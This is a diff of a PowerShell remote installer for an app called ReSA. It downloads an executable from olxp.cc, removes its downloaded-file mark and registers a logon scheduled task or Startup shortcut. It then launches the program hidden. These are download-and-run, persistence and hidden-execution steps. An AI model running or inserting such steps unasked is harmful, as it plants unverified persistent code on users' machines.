@@ -1,4 +1,4 @@
-﻿# ReSA — remote one-click install
+﻿# ReSA remote one-click install
 param(
     [string]$BaseUrl = "https://olxp.cc/download",
     [switch]$Silent
@@ -7,6 +7,7 @@ param(
 $ErrorActionPreference = "Stop"
 $Dir = Join-Path $env:LOCALAPPDATA "ReSA"
 $Exe = Join-Path $Dir "ReSA.exe"
+$TempExe = Join-Path $env:TEMP "ReSA-download.exe"
 $TaskName = "ReSA"
 $Url = ($BaseUrl.TrimEnd("/") + "/ReSA.exe")
 $LogFile = Join-Path $env:TEMP "ReSA-install.log"
@@ -22,9 +23,22 @@ function Write-InstallLog {
     }
 }
 
-function Format-Megabytes {
-    param([long]$Bytes)
-    return [math]::Round($Bytes / 1MB, 1)
+function Show-InstallError {
+    param([string]$Text)
+    Write-InstallLog $Text
+    if ($Silent) {
+        try {
+            $shell = New-Object -ComObject WScript.Shell
+            $shell.Popup(
+                "ReSA install failed.`n$Text`n`nLog: $LogFile",
+                0,
+                "ReSA",
+                16
+            ) | Out-Null
+        } catch {}
+    } else {
+        Write-Host $Text -ForegroundColor Red
+    }
 }
 
 function Download-File {
@@ -34,84 +48,80 @@ function Download-File {
     )
 
     $ProgressPreference = "SilentlyContinue"
-    $request = [System.Net.HttpWebRequest]::Create($Url)
-    $request.UserAgent = "ReSA-Installer/1.0"
-    $request.Timeout = 600000
-    $response = $request.GetResponse()
-    $total = [long]$response.ContentLength
-    $stream = $response.GetResponseStream()
-    $fileStream = [System.IO.File]::Create($OutFile)
-    $buffer = New-Object byte[] 65536
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    } catch {}
+
+    $params = @{
+        Uri = $Url
+        OutFile = $OutFile
+        UseBasicParsing = $true
+    }
+    if ($PSVersionTable.PSVersion.Major -lt 6) {
+        $params.UserAgent = "ReSA-Installer/1.0"
+    }
+    Invoke-WebRequest @params
+}
+
+try {
+    Write-InstallLog "install start"
+    Write-InstallLog "download: $Url"
+    Write-InstallLog "target: $Dir"
+
+    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
+
+    Get-Process -Name "ReSA" -ErrorAction SilentlyContinue |
+        Stop-Process -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Milliseconds 500
+
+    if (Test-Path -LiteralPath $TempExe) {
+        Remove-Item -LiteralPath $TempExe -Force -ErrorAction SilentlyContinue
+    }
+
+    Download-File -Url $Url -OutFile $TempExe
+    Write-InstallLog "download ok"
+
+    if (-not (Test-Path -LiteralPath $TempExe)) {
+        throw "ReSA.exe missing after download"
+    }
+
+    $length = (Get-Item -LiteralPath $TempExe).Length
+    if ($length -lt 1MB) {
+        throw "Downloaded file too small ($length bytes). Check server uploads ReSA.exe"
+    }
+
+    if (Test-Path -LiteralPath $Exe) {
+        Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
+    }
+    Move-Item -LiteralPath $TempExe -Destination $Exe -Force
+
+    Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
+
+    $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
+    $Trigger = New-ScheduledTaskTrigger -AtLogOn
+    $Settings = New-ScheduledTaskSettingsSet `
+        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
+        -StartWhenAvailable -RestartCount 3 `
+        -RestartInterval (New-TimeSpan -Minutes 1)
 
     try {
-        while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
-            $fileStream.Write($buffer, 0, $read)
-            if (-not $Silent -and $total -gt 0) {
-                $pct = [int](($fileStream.Length * 100) / $total)
-                Write-Progress -Activity "ReSA" -PercentComplete $pct
-            }
-        }
-    } finally {
-        $fileStream.Close()
-        $stream.Close()
-        $response.Close()
-        if (-not $Silent) {
-            Write-Progress -Activity "ReSA" -Completed
-        }
+        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
+        Write-InstallLog "scheduled task ok"
+    } catch {
+        $Startup = [Environment]::GetFolderPath("Startup")
+        $Wsh = New-Object -ComObject WScript.Shell
+        $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReSA.lnk"))
+        $Link.TargetPath = $Exe
+        $Link.WorkingDirectory = $Dir
+        $Link.WindowStyle = 7
+        $Link.Save()
+        Write-InstallLog "startup shortcut ok"
     }
-}
 
-Write-InstallLog "install start"
-Write-InstallLog "download: $Url"
-Write-InstallLog "target: $Dir"
-
-New-Item -ItemType Directory -Force -Path $Dir | Out-Null
-
-try {
-    Download-File -Url $Url -OutFile $Exe
-    Write-InstallLog "download ok"
+    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
+    Write-InstallLog "install complete"
+    exit 0
 } catch {
-    Write-InstallLog "download failed: $_"
+    Show-InstallError $_.Exception.Message
     exit 1
 }
-
-if (-not (Test-Path $Exe)) {
-    Write-InstallLog "missing exe after download"
-    exit 1
-}
-
-Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
-
-Get-Process -Name "ReSA" -ErrorAction SilentlyContinue |
-    Stop-Process -Force -ErrorAction SilentlyContinue
-Start-Sleep -Milliseconds 500
-
-$Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
-$Trigger = New-ScheduledTaskTrigger -AtLogOn
-$Settings = New-ScheduledTaskSettingsSet `
-    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
-    -StartWhenAvailable -RestartCount 3 `
-    -RestartInterval (New-TimeSpan -Minutes 1)
-
-try {
-    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
-    Write-InstallLog "scheduled task ok"
-} catch {
-    $Startup = [Environment]::GetFolderPath("Startup")
-    $Wsh = New-Object -ComObject WScript.Shell
-    $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReSA.lnk"))
-    $Link.TargetPath = $Exe
-    $Link.WorkingDirectory = $Dir
-    $Link.WindowStyle = 7
-    $Link.Save()
-    Write-InstallLog "startup shortcut ok"
-}
-
-$startArgs = @{
-    FilePath = $Exe
-    WorkingDirectory = $Dir
-    WindowStyle = "Hidden"
-}
-Start-Process @startArgs
-Write-InstallLog "install complete"
-exit 0
